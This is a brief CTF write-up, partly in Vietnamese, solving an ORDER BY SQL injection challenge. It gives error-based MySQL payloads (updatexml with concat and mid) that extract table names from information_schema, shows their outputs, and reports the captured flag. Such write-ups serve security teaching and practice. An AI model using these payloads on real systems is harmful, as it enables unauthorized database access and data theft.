# KMA CTF - Try SQL Map

**hints**: The length of flag table name > 32 characters

## PHÂN TÍCH
Như tên bài , thì đây là bài SQLi ở lệnh ORDER BY: `http://try-sqlmap.ctf.actvn.edu.vn/?order=id`

Câu truy vấn có thể sẽ như sau:

```
SELECT column_name from table_name order by $_GET[order]
```

`Quick sqlmap` --> sql injection `error based`!

**Payload**:
```
updatexml(0,concat(0xa,(select table_name from information_schema.tables limit 1)),0)
```
**Result**:
```
XPATH syntax error: '
flahga123456789xxsxx012xxxxxxxx'
```

Because of the length, we use mid function in MySQL to cut the rest of flag that are not fully obtain.

```
updatexml(0,concat(0xa,(select mid(table_name,20,25) from information_schema.tables limit 1)),0)
```
**Result**:
```
XPATH syntax error: '
x012xxxxxxxxx34567xx1'
```

Ok, merge it together: `flahga123456789xxsxx012xxxxxxxxx34567xx1`, we got the table name.

Same with column and flag using column_name from information_schema.tables --> select column_name from flahga123456789xxsxx012xxxxxxxxx34567xx1....

**flag**: `KMACTF{X_Ooooooooooooorder_By_Noooooooooooooooooooone_SQLMaaaaaaaaaaaap?!!!!!!!!!!!!}`

**Góc than thở**:
```
Trước khi kết luật điều gì, check kĩ liệu payload có lỗi, hàm nào thực sự bị block. Mỗi chall lỗi nó dump khác nhau, tiêu chỉnh từ từ, đừng ngu.
```
